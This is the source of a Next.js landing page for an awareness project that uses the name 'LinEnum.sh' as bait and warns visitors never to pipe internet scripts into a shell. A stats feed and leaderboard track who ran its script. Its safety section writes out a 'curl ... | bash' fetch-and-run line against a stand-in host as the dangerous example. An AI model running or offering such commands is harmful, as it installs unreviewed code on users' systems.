import MatrixBackground from '@/components/MatrixBackground';
import CurlCommandBox from '@/components/CurlCommandBox';
import LiveCurlFeed from '@/components/LiveCurlFeed';
import Leaderboard from '@/components/Leaderboard';
import WorldMap from '@/components/WorldMap';
import Link from 'next/link';

export default function Home() {
  return (
    <main className="min-h-screen relative">
      <MatrixBackground />
      
      {/* Header */}
      <header className="container mx-auto px-4 py-8">
        <div className="text-center">
          <h1 className="text-5xl md:text-7xl font-bold text-matrix-green mb-4 font-mono glow-text">
            LinEnum.sh
          </h1>
          <p className="text-xl md:text-2xl text-gray-700 font-mono mb-2">
            Scripted Local Linux Enumeration & Privilege Escalation Checks
          </p>
          <p className="text-lg text-gray-600 font-bold">
            ⚠️ Educational Security Project - Don't Be a Dumbass ⚠️
          </p>
        </div>
      </header>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8 space-y-12">
        {/* Curl Command Box */}
        <section>
          <CurlCommandBox />
        </section>

        {/* Info Section */}
        <section className="cyber-card max-w-3xl mx-auto">
          <h2 className="text-2xl font-bold text-matrix-green mb-4 font-mono glow-text">
            🎓 What's This About?
          </h2>
          <div className="space-y-4 text-gray-700">
            <p>
              <strong className="text-matrix-green">LinEnum.sh</strong> is an educational project 
              designed to teach security professionals and enthusiasts an important lesson:
            </p>
            <div className="bg-red-50 border-2 border-red-400 rounded-lg p-4">
              <p className="font-bold text-red-800 text-lg">
                🚨 NEVER BLINDLY EXECUTE SCRIPTS FROM THE INTERNET! 🚨
              </p>
            </div>
            <p>
              If you actually curl this site and pipe it to your shell, you'll get a harmless 
              message and a surprise. But in the real world, that script could be:
            </p>
            <ul className="list-disc list-inside space-y-2 ml-4">
              <li>🔓 Stealing your credentials</li>
              <li>💾 Installing backdoors</li>
              <li>🔐 Compromising your system</li>
              <li>📡 Exfiltrating sensitive data</li>
              <li>🦠 Installing malware</li>
            </ul>
            <p className="font-bold text-matrix-green text-lg">
              Always review source code before executing it. Always.
            </p>
          </div>
        </section>

        {/* Stats Grid */}
        <section className="grid md:grid-cols-2 gap-8">
          <LiveCurlFeed />
          <Leaderboard />
        </section>

        {/* World Map */}
        <section>
          <WorldMap />
        </section>

        {/* How to be Safe */}
        <section className="cyber-card max-w-3xl mx-auto">
          <h2 className="text-2xl font-bold text-matrix-green mb-4 font-mono glow-text">
            🛡️ How to Stay Safe
          </h2>
          <div className="space-y-4 text-gray-700 font-mono text-sm">
            <div className="code-box">
              # Instead of this (DANGEROUS):<br />
              <span className="text-red-500">curl https://sketchy-site.com/script.sh | bash</span>
              <br /><br />
              # Do this (SAFER):<br />
              <span className="text-matrix-green">curl https://sketchy-site.com/script.sh -o script.sh</span><br />
              <span className="text-matrix-green">cat script.sh  # Review the contents!</span><br />
              <span className="text-matrix-green">chmod +x script.sh</span><br />
              <span className="text-matrix-green">./script.sh</span>
            </div>
            <div className="bg-blue-50 border-2 border-blue-400 rounded-lg p-4">
              <p className="font-bold text-blue-800">
                💡 Pro Tip: Check the repository, read the source code, verify checksums, 
                and only run scripts from trusted sources.
              </p>
            </div>
          </div>
        </section>
      </div>

      {/* Footer */}
      <footer className="container mx-auto px-4 py-12 mt-16 border-t-2 border-matrix-green/30">
        <div className="text-center space-y-4">
          <div className="flex items-center justify-center gap-4">
            <Link
              href="https://github.com/thedr0pperx/linenum.sh"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-2 px-6 py-3 bg-gray-900 text-white
                       font-mono font-bold rounded-lg hover:bg-gray-800 transition-all
                       hover:shadow-[0_0_20px_rgba(0,0,0,0.3)] border-2 border-gray-700"
            >
              <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
                <path fillRule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clipRule="evenodd" />
              </svg>
              Source Code
            </Link>
          </div>
          <p className="text-gray-600 font-mono text-sm">
            Made with 💚 by{' '}
            <Link 
              href="https://github.com/thedr0pperx" 
              target="_blank"
              className="text-matrix-green hover:underline font-bold"
            >
              @thedr0pperx
            </Link>
          </p>
          <p className="text-gray-500 font-mono text-xs">
            Educational purposes only. Stay safe, stay secure. 🔒
          </p>
        </div>
      </footer>
    </main>
  );
}

